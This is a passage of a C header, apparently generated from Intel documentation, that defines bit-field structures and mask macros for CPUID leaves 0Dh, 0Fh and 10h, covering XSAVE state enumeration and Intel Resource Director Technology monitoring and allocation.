#define CPUID_EDX_X2APIC_ID_BIT 0
#define CPUID_EDX_X2APIC_ID_FLAG 0xFFFFFFFF
#define CPUID_EDX_X2APIC_ID_MASK 0xFFFFFFFF
#define CPUID_EDX_X2APIC_ID(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_0B;

/**
 * @defgroup CPUID_EAX_0D \
 *           EAX = 0x0D
 *
 * When CPUID executes with EAX set to 0DH and ECX = 0, the processor returns information about the
 * bit-vector representation of all processor state extensions that are supported in the processor
 * and storage size requirements of the XSAVE/XRSTOR area. When CPUID executes with EAX set to 0DH
 * and ECX = n (n > 1, and is a valid sub-leaf index), the processor returns information about the
 * size and offset of each processor extended state save area within the XSAVE/XRSTOR area. Software
 * can use the forward-extendable technique depicted below to query the valid sub-leaves and obtain
 * size and offset information for each processor extended state save area: <pre> For i = 2 to 62 //
 * sub-leaf 1 is reserved IF (CPUID.(EAX=0DH, ECX=0):VECTOR[i] = 1) // VECTOR is the 64-bit value of
 * EDX:EAX Execute CPUID.(EAX=0DH, ECX = i) to examine size and offset for sub-leaf i; FI; </pre>
 * @{
 */
#define CPUID_EXTENDED_STATE_INFORMATION 0x0000000D
/**
 * @brief Processor Extended State Enumeration Main Leaf (EAX = 0DH, ECX = 0)
 */
typedef struct {
  /**
   * @brief Reports the supported bits of the lower 32 bits of XCR0. XCR0[n] can be set to 1 only if
   * EAX[n] is 1
   */
  union {
    struct {
      /**
       * [Bit 0] x87 state.
       */
      UINT32 X87State : 1;
#define CPUID_EAX_X87_STATE_BIT 0
#define CPUID_EAX_X87_STATE_FLAG 0x01
#define CPUID_EAX_X87_STATE_MASK 0x01
#define CPUID_EAX_X87_STATE(_) (((_) >> 0) & 0x01)

      /**
       * [Bit 1] SSE state.
       */
      UINT32 SseState : 1;
#define CPUID_EAX_SSE_STATE_BIT 1
#define CPUID_EAX_SSE_STATE_FLAG 0x02
#define CPUID_EAX_SSE_STATE_MASK 0x01
#define CPUID_EAX_SSE_STATE(_) (((_) >> 1) & 0x01)

      /**
       * [Bit 2] AVX state.
       */
      UINT32 AvxState : 1;
#define CPUID_EAX_AVX_STATE_BIT 2
#define CPUID_EAX_AVX_STATE_FLAG 0x04
#define CPUID_EAX_AVX_STATE_MASK 0x01
#define CPUID_EAX_AVX_STATE(_) (((_) >> 2) & 0x01)

      /**
       * [Bits 4:3] MPX state.
       */
      UINT32 MpxState : 2;
#define CPUID_EAX_MPX_STATE_BIT 3
#define CPUID_EAX_MPX_STATE_FLAG 0x18
#define CPUID_EAX_MPX_STATE_MASK 0x03
#define CPUID_EAX_MPX_STATE(_) (((_) >> 3) & 0x03)

      /**
       * [Bits 7:5] AVX-512 state.
       */
      UINT32 Avx512State : 3;
#define CPUID_EAX_AVX_512_STATE_BIT 5
#define CPUID_EAX_AVX_512_STATE_FLAG 0xE0
#define CPUID_EAX_AVX_512_STATE_MASK 0x07
#define CPUID_EAX_AVX_512_STATE(_) (((_) >> 5) & 0x07)

      /**
       * [Bit 8] Used for IA32_XSS.
       */
      UINT32 UsedForIa32Xss1 : 1;
#define CPUID_EAX_USED_FOR_IA32_XSS_1_BIT 8
#define CPUID_EAX_USED_FOR_IA32_XSS_1_FLAG 0x100
#define CPUID_EAX_USED_FOR_IA32_XSS_1_MASK 0x01
#define CPUID_EAX_USED_FOR_IA32_XSS_1(_) (((_) >> 8) & 0x01)

      /**
       * [Bit 9] PKRU state.
       */
      UINT32 PkruState : 1;
#define CPUID_EAX_PKRU_STATE_BIT 9
#define CPUID_EAX_PKRU_STATE_FLAG 0x200
#define CPUID_EAX_PKRU_STATE_MASK 0x01
#define CPUID_EAX_PKRU_STATE(_) (((_) >> 9) & 0x01)
      UINT32 Reserved1 : 3;

      /**
       * [Bit 13] Used for IA32_XSS.
       */
      UINT32 UsedForIa32Xss2 : 1;
#define CPUID_EAX_USED_FOR_IA32_XSS_2_BIT 13
#define CPUID_EAX_USED_FOR_IA32_XSS_2_FLAG 0x2000
#define CPUID_EAX_USED_FOR_IA32_XSS_2_MASK 0x01
#define CPUID_EAX_USED_FOR_IA32_XSS_2(_) (((_) >> 13) & 0x01)
      UINT32 Reserved2 : 18;
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 31:0] Maximum size (bytes, from the beginning of the XSAVE/XRSTOR save area) required
       * by enabled features in XCR0. May be different than ECX if some features at the end of the
       * XSAVE save area are not enabled.
       */
      UINT32 MaxSizeRequiredByEnabledFeaturesInXcr0 : 32;
#define CPUID_EBX_MAX_SIZE_REQUIRED_BY_ENABLED_FEATURES_IN_XCR0_BIT 0
#define CPUID_EBX_MAX_SIZE_REQUIRED_BY_ENABLED_FEATURES_IN_XCR0_FLAG 0xFFFFFFFF
#define CPUID_EBX_MAX_SIZE_REQUIRED_BY_ENABLED_FEATURES_IN_XCR0_MASK 0xFFFFFFFF
#define CPUID_EBX_MAX_SIZE_REQUIRED_BY_ENABLED_FEATURES_IN_XCR0(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] Maximum size (bytes, from the beginning of the XSAVE/XRSTOR save area) of the
       * XSAVE/XRSTOR save area required by all supported features in the processor, i.e., all the
       * valid bit fields in XCR0.
       */
      UINT32 MaxSizeOfXsaveXrstorSaveArea : 32;
#define CPUID_ECX_MAX_SIZE_OF_XSAVE_XRSTOR_SAVE_AREA_BIT 0
#define CPUID_ECX_MAX_SIZE_OF_XSAVE_XRSTOR_SAVE_AREA_FLAG 0xFFFFFFFF
#define CPUID_ECX_MAX_SIZE_OF_XSAVE_XRSTOR_SAVE_AREA_MASK 0xFFFFFFFF
#define CPUID_ECX_MAX_SIZE_OF_XSAVE_XRSTOR_SAVE_AREA(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 31:0] Reports the supported bits of the upper 32 bits of XCR0. XCR0[n+32] can be set
       * to 1 only if EDX[n] is 1.
       */
      UINT32 Xcr0SupportedBits : 32;
#define CPUID_EDX_XCR0_SUPPORTED_BITS_BIT 0
#define CPUID_EDX_XCR0_SUPPORTED_BITS_FLAG 0xFFFFFFFF
#define CPUID_EDX_XCR0_SUPPORTED_BITS_MASK 0xFFFFFFFF
#define CPUID_EDX_XCR0_SUPPORTED_BITS(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_0D_ECX_00;

/**
 * @brief Direct Cache Access Information Leaf
 */
typedef struct {
  union {
    struct {
      UINT32 Reserved1 : 1;

      /**
       * [Bit 1] Supports XSAVEC and the compacted form of XRSTOR if set.
       */
      UINT32 SupportsXsavecAndCompactedXrstor : 1;
#define CPUID_EAX_SUPPORTS_XSAVEC_AND_COMPACTED_XRSTOR_BIT 1
#define CPUID_EAX_SUPPORTS_XSAVEC_AND_COMPACTED_XRSTOR_FLAG 0x02
#define CPUID_EAX_SUPPORTS_XSAVEC_AND_COMPACTED_XRSTOR_MASK 0x01
#define CPUID_EAX_SUPPORTS_XSAVEC_AND_COMPACTED_XRSTOR(_) (((_) >> 1) & 0x01)

      /**
       * [Bit 2] Supports XGETBV with ECX = 1 if set.
       */
      UINT32 SupportsXgetbvWithEcx1 : 1;
#define CPUID_EAX_SUPPORTS_XGETBV_WITH_ECX_1_BIT 2
#define CPUID_EAX_SUPPORTS_XGETBV_WITH_ECX_1_FLAG 0x04
#define CPUID_EAX_SUPPORTS_XGETBV_WITH_ECX_1_MASK 0x01
#define CPUID_EAX_SUPPORTS_XGETBV_WITH_ECX_1(_) (((_) >> 2) & 0x01)

      /**
       * [Bit 3] Supports XSAVES/XRSTORS and IA32_XSS if set.
       */
      UINT32 SupportsXsaveXrstorAndIa32Xss : 1;
#define CPUID_EAX_SUPPORTS_XSAVE_XRSTOR_AND_IA32_XSS_BIT 3
#define CPUID_EAX_SUPPORTS_XSAVE_XRSTOR_AND_IA32_XSS_FLAG 0x08
#define CPUID_EAX_SUPPORTS_XSAVE_XRSTOR_AND_IA32_XSS_MASK 0x01
#define CPUID_EAX_SUPPORTS_XSAVE_XRSTOR_AND_IA32_XSS(_) (((_) >> 3) & 0x01)
      UINT32 Reserved2 : 28;
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 31:0] The size in bytes of the XSAVE area containing all states enabled by XCRO |
       * IA32_XSS.
       */
      UINT32 SizeOfXsaveAread : 32;
#define CPUID_EBX_SIZE_OF_XSAVE_AREAD_BIT 0
#define CPUID_EBX_SIZE_OF_XSAVE_AREAD_FLAG 0xFFFFFFFF
#define CPUID_EBX_SIZE_OF_XSAVE_AREAD_MASK 0xFFFFFFFF
#define CPUID_EBX_SIZE_OF_XSAVE_AREAD(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 7:0] Used for XCR0.
       */
      UINT32 UsedForXcr01 : 8;
#define CPUID_ECX_USED_FOR_XCR0_1_BIT 0
#define CPUID_ECX_USED_FOR_XCR0_1_FLAG 0xFF
#define CPUID_ECX_USED_FOR_XCR0_1_MASK 0xFF
#define CPUID_ECX_USED_FOR_XCR0_1(_) (((_) >> 0) & 0xFF)

      /**
       * [Bit 8] PT state.
       */
      UINT32 PtState : 1;
#define CPUID_ECX_PT_STATE_BIT 8
#define CPUID_ECX_PT_STATE_FLAG 0x100
#define CPUID_ECX_PT_STATE_MASK 0x01
#define CPUID_ECX_PT_STATE(_) (((_) >> 8) & 0x01)

      /**
       * [Bit 9] Used for XCR0.
       */
      UINT32 UsedForXcr02 : 1;
#define CPUID_ECX_USED_FOR_XCR0_2_BIT 9
#define CPUID_ECX_USED_FOR_XCR0_2_FLAG 0x200
#define CPUID_ECX_USED_FOR_XCR0_2_MASK 0x01
#define CPUID_ECX_USED_FOR_XCR0_2(_) (((_) >> 9) & 0x01)
      UINT32 Reserved1 : 3;

      /**
       * [Bit 13] HWP state.
       */
      UINT32 HwpState : 1;
#define CPUID_ECX_HWP_STATE_BIT 13
#define CPUID_ECX_HWP_STATE_FLAG 0x2000
#define CPUID_ECX_HWP_STATE_MASK 0x01
#define CPUID_ECX_HWP_STATE(_) (((_) >> 13) & 0x01)
      UINT32 Reserved2 : 18;
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 31:0] EDX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT 0
#define CPUID_EDX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EDX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_0D_ECX_01;

/**
 * @brief Processor Extended State Enumeration Sub-leaves (EAX = 0DH, ECX = n, n > 1)
 *
 * @note Leaf 0DH output depends on the initial value in ECX. Each sub-leaf index (starting at
 * position 2) is supported if it corresponds to a supported bit in either the XCR0 register or the
 * IA32_XSS MSR. If ECX contains an invalid sub-leaf index, EAX/EBX/ECX/EDX return 0. Sub-leaf n (0
 * <= n <= 31) is invalid if sub-leaf 0 returns 0 in EAX[n] and sub-leaf 1 returns 0 in ECX[n].
 * Sub-leaf n (32 <= n <= 63) is invalid if sub-leaf 0 returns 0 in EDX[n-32] and sub-leaf 1 returns
 * 0 in EDX[n-32].
 */
typedef struct {
  union {
    struct {
      /**
       * [Bits 31:0] The size in bytes (from the offset specified in EBX) of the save area for an
       * extended state feature associated with a valid sub-leaf index, n.
       */
      UINT32 Ia32PlatformDcaCap : 32;
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP_BIT 0
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP_FLAG 0xFFFFFFFF
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP_MASK 0xFFFFFFFF
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 31:0] The offset in bytes of this extended state component's save area from the
       * beginning of the XSAVE/XRSTOR area. This field reports 0 if the sub-leaf index, n, does not
       * map to a valid bit in the XCR0 register.
       */
      UINT32 Reserved : 32;
#define CPUID_EBX_RESERVED_BIT 0
#define CPUID_EBX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EBX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EBX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bit 0] Is set if the bit n (corresponding to the sub-leaf index) is supported in the
       * IA32_XSS MSR; it is clear if bit n is instead supported in XCR0.
       */
      UINT32 Ecx2 : 1;
#define CPUID_ECX_ECX_2_BIT 0
#define CPUID_ECX_ECX_2_FLAG 0x01
#define CPUID_ECX_ECX_2_MASK 0x01
#define CPUID_ECX_ECX_2(_) (((_) >> 0) & 0x01)

      /**
       * [Bit 1] Is set if, when the compacted format of an XSAVE area is used, this extended state
       * component located on the next 64-byte boundary following the preceding state component
       * (otherwise, it is located immediately following the preceding state component).
       */
      UINT32 Ecx1 : 1;
#define CPUID_ECX_ECX_1_BIT 1
#define CPUID_ECX_ECX_1_FLAG 0x02
#define CPUID_ECX_ECX_1_MASK 0x01
#define CPUID_ECX_ECX_1(_) (((_) >> 1) & 0x01)
      UINT32 Reserved1 : 30;
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 31:0] This field reports 0 if the sub-leaf index, n, is invalid; otherwise it is
       * reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT 0
#define CPUID_EDX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EDX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_0D_ECX_N;

/**
 * @}
 */

/**
 * @defgroup CPUID_EAX_0F \
 *           EAX = 0x0F
 *
 * When CPUID executes with EAX set to 0FH and ECX = 0, the processor returns information about the
 * bit-vector representation of QoS monitoring resource types that are supported in the processor
 * and maximum range of RMID values the processor can use to monitor of any supported resource
 * types. Each bit, starting from bit 1, corresponds to a specific resource type if the bit is set.
 * The bit position corresponds to the sub-leaf index (or ResID) that software must use to query QoS
 * monitoring capability available for that type. See Table 3-8. When CPUID executes with EAX set to
 * 0FH and ECX = n (n >= 1, and is a valid ResID), the processor returns information software can
 * use to program IA32_PQR_ASSOC, IA32_QM_EVTSEL MSRs before reading QoS data from the IA32_QM_CTR
 * MSR.
 * @{
 */
#define CPUID_INTEL_RESOURCE_DIRECTOR_TECHNOLOGY_MONITORING_INFORMATION 0x0000000F
/**
 * @brief Intel Resource Director Technology (Intel RDT) Monitoring Enumeration Sub-leaf (EAX = 0FH,
 * ECX = 0)
 *
 * @note Leaf 0FH output depends on the initial value in ECX. Sub-leaf index 0 reports valid
 * resource type starting at bit position 1 of EDX.
 */
typedef struct {
  union {
    struct {
      /**
       * [Bits 31:0] EAX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EAX_RESERVED_BIT 0
#define CPUID_EAX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EAX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EAX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 31:0] Maximum range (zero-based) of RMID within this physical processor of all types.
       */
      UINT32 RmidMaxRange : 32;
#define CPUID_EBX_RMID_MAX_RANGE_BIT 0
#define CPUID_EBX_RMID_MAX_RANGE_FLAG 0xFFFFFFFF
#define CPUID_EBX_RMID_MAX_RANGE_MASK 0xFFFFFFFF
#define CPUID_EBX_RMID_MAX_RANGE(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] ECX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_ECX_RESERVED_BIT 0
#define CPUID_ECX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_ECX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_ECX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      UINT32 Reserved1 : 1;

      /**
       * [Bit 1] Supports L3 Cache Intel RDT Monitoring if 1.
       */
      UINT32 SupportsL3CacheIntelRdtMonitoring : 1;
#define CPUID_EDX_SUPPORTS_L3_CACHE_INTEL_RDT_MONITORING_BIT 1
#define CPUID_EDX_SUPPORTS_L3_CACHE_INTEL_RDT_MONITORING_FLAG 0x02
#define CPUID_EDX_SUPPORTS_L3_CACHE_INTEL_RDT_MONITORING_MASK 0x01
#define CPUID_EDX_SUPPORTS_L3_CACHE_INTEL_RDT_MONITORING(_) (((_) >> 1) & 0x01)
      UINT32 Reserved2 : 30;
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_0F_ECX_00;

/**
 * @brief L3 Cache Intel RDT Monitoring Capability Enumeration Sub-leaf (EAX = 0FH, ECX = 1)
 *
 * @note Leaf 0FH output depends on the initial value in ECX.
 */
typedef struct {
  union {
    struct {
      /**
       * [Bits 31:0] EAX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EAX_RESERVED_BIT 0
#define CPUID_EAX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EAX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EAX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 31:0] Conversion factor from reported IA32_QM_CTR value to occupancy metric (bytes).
       */
      UINT32 ConversionFactor : 32;
#define CPUID_EBX_CONVERSION_FACTOR_BIT 0
#define CPUID_EBX_CONVERSION_FACTOR_FLAG 0xFFFFFFFF
#define CPUID_EBX_CONVERSION_FACTOR_MASK 0xFFFFFFFF
#define CPUID_EBX_CONVERSION_FACTOR(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] Maximum range (zero-based) of RMID within this physical processor of all types.
       */
      UINT32 RmidMaxRange : 32;
#define CPUID_ECX_RMID_MAX_RANGE_BIT 0
#define CPUID_ECX_RMID_MAX_RANGE_FLAG 0xFFFFFFFF
#define CPUID_ECX_RMID_MAX_RANGE_MASK 0xFFFFFFFF
#define CPUID_ECX_RMID_MAX_RANGE(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bit 0] Supports L3 occupancy monitoring if 1.
       */
      UINT32 SupportsL3OccupancyMonitoring : 1;
#define CPUID_EDX_SUPPORTS_L3_OCCUPANCY_MONITORING_BIT 0
#define CPUID_EDX_SUPPORTS_L3_OCCUPANCY_MONITORING_FLAG 0x01
#define CPUID_EDX_SUPPORTS_L3_OCCUPANCY_MONITORING_MASK 0x01
#define CPUID_EDX_SUPPORTS_L3_OCCUPANCY_MONITORING(_) (((_) >> 0) & 0x01)

      /**
       * [Bit 1] Supports L3 Total Bandwidth monitoring if 1.
       */
      UINT32 SupportsL3TotalBandwidthMonitoring : 1;
#define CPUID_EDX_SUPPORTS_L3_TOTAL_BANDWIDTH_MONITORING_BIT 1
#define CPUID_EDX_SUPPORTS_L3_TOTAL_BANDWIDTH_MONITORING_FLAG 0x02
#define CPUID_EDX_SUPPORTS_L3_TOTAL_BANDWIDTH_MONITORING_MASK 0x01
#define CPUID_EDX_SUPPORTS_L3_TOTAL_BANDWIDTH_MONITORING(_) (((_) >> 1) & 0x01)

      /**
       * [Bit 2] Supports L3 Local Bandwidth monitoring if 1.
       */
      UINT32 SupportsL3LocalBandwidthMonitoring : 1;
#define CPUID_EDX_SUPPORTS_L3_LOCAL_BANDWIDTH_MONITORING_BIT 2
#define CPUID_EDX_SUPPORTS_L3_LOCAL_BANDWIDTH_MONITORING_FLAG 0x04
#define CPUID_EDX_SUPPORTS_L3_LOCAL_BANDWIDTH_MONITORING_MASK 0x01
#define CPUID_EDX_SUPPORTS_L3_LOCAL_BANDWIDTH_MONITORING(_) (((_) >> 2) & 0x01)
      UINT32 Reserved1 : 29;
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_0F_ECX_01;

/**
 * @}
 */

/**
 * @defgroup CPUID_EAX_10 \
 *           EAX = 0x10
 *
 * When CPUID executes with EAX set to 10H and ECX = 0, the processor returns information about the
 * bit-vector representation of QoS Enforcement resource types that are supported in the processor.
 * Each bit, starting from bit 1, corresponds to a specific resource type if the bit is set. The bit
 * position corresponds to the sub-leaf index (or ResID) that software must use to query QoS
 * enforcement capability available for that type. When CPUID executes with EAX set to 10H and ECX =
 * n (n >= 1, and is a valid ResID), the processor returns information about available classes of
 * service and range of QoS mask MSRs that software can use to configure each class of services
 * using capability bit masks in the QoS Mask registers, IA32_resourceType_Mask_n.
 * @{
 */
#define CPUID_INTEL_RESOURCE_DIRECTOR_TECHNOLOGY_ALLOCATION_INFORMATION 0x00000010
/**
 * @brief Intel Resource Director Technology (Intel RDT) Allocation Enumeration Sub-leaf (EAX = 10H,
 * ECX = 0)
 *
 * @note Leaf 10H output depends on the initial value in ECX. Sub-leaf index 0 reports valid
 * resource identification (ResID) starting at bit position 1 of EBX.
 */
typedef struct {
  union {
    struct {
      /**
       * [Bits 31:0] Value of bits [31:0] of IA32_PLATFORM_DCA_CAP MSR (address 1F8H).
       */
      UINT32 Ia32PlatformDcaCap : 32;
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP_BIT 0
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP_FLAG 0xFFFFFFFF
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP_MASK 0xFFFFFFFF
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      UINT32 Reserved1 : 1;

      /**
       * [Bit 1] Supports L3 Cache Allocation Technology if 1.
       */
      UINT32 SupportsL3CacheAllocationTechnology : 1;
#define CPUID_EBX_SUPPORTS_L3_CACHE_ALLOCATION_TECHNOLOGY_BIT 1
#define CPUID_EBX_SUPPORTS_L3_CACHE_ALLOCATION_TECHNOLOGY_FLAG 0x02
#define CPUID_EBX_SUPPORTS_L3_CACHE_ALLOCATION_TECHNOLOGY_MASK 0x01
#define CPUID_EBX_SUPPORTS_L3_CACHE_ALLOCATION_TECHNOLOGY(_) (((_) >> 1) & 0x01)

      /**
       * [Bit 2] Supports L2 Cache Allocation Technology if 1.
       */
      UINT32 SupportsL2CacheAllocationTechnology : 1;
#define CPUID_EBX_SUPPORTS_L2_CACHE_ALLOCATION_TECHNOLOGY_BIT 2
#define CPUID_EBX_SUPPORTS_L2_CACHE_ALLOCATION_TECHNOLOGY_FLAG 0x04
#define CPUID_EBX_SUPPORTS_L2_CACHE_ALLOCATION_TECHNOLOGY_MASK 0x01
#define CPUID_EBX_SUPPORTS_L2_CACHE_ALLOCATION_TECHNOLOGY(_) (((_) >> 2) & 0x01)

      /**
       * [Bit 3] Supports Memory Bandwidth Allocation if 1.
       */
      UINT32 SupportsMemoryBandwidthAllocation : 1;
#define CPUID_EBX_SUPPORTS_MEMORY_BANDWIDTH_ALLOCATION_BIT 3
#define CPUID_EBX_SUPPORTS_MEMORY_BANDWIDTH_ALLOCATION_FLAG 0x08
#define CPUID_EBX_SUPPORTS_MEMORY_BANDWIDTH_ALLOCATION_MASK 0x01
#define CPUID_EBX_SUPPORTS_MEMORY_BANDWIDTH_ALLOCATION(_) (((_) >> 3) & 0x01)
      UINT32 Reserved2 : 28;
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] ECX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_ECX_RESERVED_BIT 0
#define CPUID_ECX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_ECX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_ECX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 31:0] EDX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT 0
#define CPUID_EDX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EDX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_10_ECX_00;

/**
 * @brief L3 Cache Allocation Technology Enumeration Sub-leaf (EAX = 10H, ECX = ResID = 1)
 *
 * @note Leaf 10H output depends on the initial value in ECX.
 */
typedef struct {
  union {
    struct {
      /**
       * [Bits 4:0] Length of the capacity bit mask for the corresponding ResID using minus-one
       * notation.
       */
      UINT32 LengthOfCapacityBitMask : 5;
#define CPUID_EAX_LENGTH_OF_CAPACITY_BIT_MASK_BIT 0
#define CPUID_EAX_LENGTH_OF_CAPACITY_BIT_MASK_FLAG 0x1F
#define CPUID_EAX_LENGTH_OF_CAPACITY_BIT_MASK_MASK 0x1F
#define CPUID_EAX_LENGTH_OF_CAPACITY_BIT_MASK(_) (((_) >> 0) & 0x1F)
      UINT32 Reserved1 : 27;
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 31:0] Bit-granular map of isolation/contention of allocation units.
       */
      UINT32 Ebx0 : 32;
#define CPUID_EBX_EBX_0_BIT 0
#define CPUID_EBX_EBX_0_FLAG 0xFFFFFFFF
#define CPUID_EBX_EBX_0_MASK 0xFFFFFFFF
#define CPUID_EBX_EBX_0(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      UINT32 Reserved1 : 2;

      /**
       * [Bit 2] Code and Data Prioritization Technology supported if 1.
       */
      UINT32 CodeAndDataPriorizationTechnologySupported : 1;
#define CPUID_ECX_CODE_AND_DATA_PRIORIZATION_TECHNOLOGY_SUPPORTED_BIT 2
#define CPUID_ECX_CODE_AND_DATA_PRIORIZATION_TECHNOLOGY_SUPPORTED_FLAG 0x04
#define CPUID_ECX_CODE_AND_DATA_PRIORIZATION_TECHNOLOGY_SUPPORTED_MASK 0x01
#define CPUID_ECX_CODE_AND_DATA_PRIORIZATION_TECHNOLOGY_SUPPORTED(_) (((_) >> 2) & 0x01)
      UINT32 Reserved2 : 29;
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 15:0] Highest COS number supported for this ResID.
       */
      UINT32 HighestCosNumberSupported : 16;
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED_BIT 0
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED_FLAG 0xFFFF
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED_MASK 0xFFFF
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED(_) (((_) >> 0) & 0xFFFF)
      UINT32 Reserved1 : 16;
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_10_ECX_01;

/**
 * @brief L2 Cache Allocation Technology Enumeration Sub-leaf (EAX = 10H, ECX = ResID = 2)
 *
 * @note Leaf 10H output depends on the initial value in ECX.
 */
typedef struct {
  union {
    struct {
      /**
       * [Bits 4:0] Length of the capacity bit mask for the corresponding ResID using minus-one
       * notation.
       */
      UINT32 LengthOfCapacityBitMask : 5;
#define CPUID_EAX_LENGTH_OF_CAPACITY_BIT_MASK_BIT 0
#define CPUID_EAX_LENGTH_OF_CAPACITY_BIT_MASK_FLAG 0x1F
#define CPUID_EAX_LENGTH_OF_CAPACITY_BIT_MASK_MASK 0x1F
#define CPUID_EAX_LENGTH_OF_CAPACITY_BIT_MASK(_) (((_) >> 0) & 0x1F)
      UINT32 Reserved1 : 27;
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 31:0] Bit-granular map of isolation/contention of allocation units.
       */
      UINT32 Ebx0 : 32;
#define CPUID_EBX_EBX_0_BIT 0
#define CPUID_EBX_EBX_0_FLAG 0xFFFFFFFF
#define CPUID_EBX_EBX_0_MASK 0xFFFFFFFF
#define CPUID_EBX_EBX_0(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] ECX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_ECX_RESERVED_BIT 0
#define CPUID_ECX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_ECX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_ECX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 15:0] Highest COS number supported for this ResID.
       */
      UINT32 HighestCosNumberSupported : 16;
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED_BIT 0
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED_FLAG 0xFFFF
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED_MASK 0xFFFF
#define CPUID_EDX_HIGHEST_COS_NUMBER_SUPPORTED(_) (((_) >> 0) & 0xFFFF)
      UINT32 Reserved1 : 16;
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_10_ECX_02;

/**
 * @brief Memory Bandwidth Allocation Enumeration Sub-leaf (EAX = 10H, ECX = ResID = 3)
 *
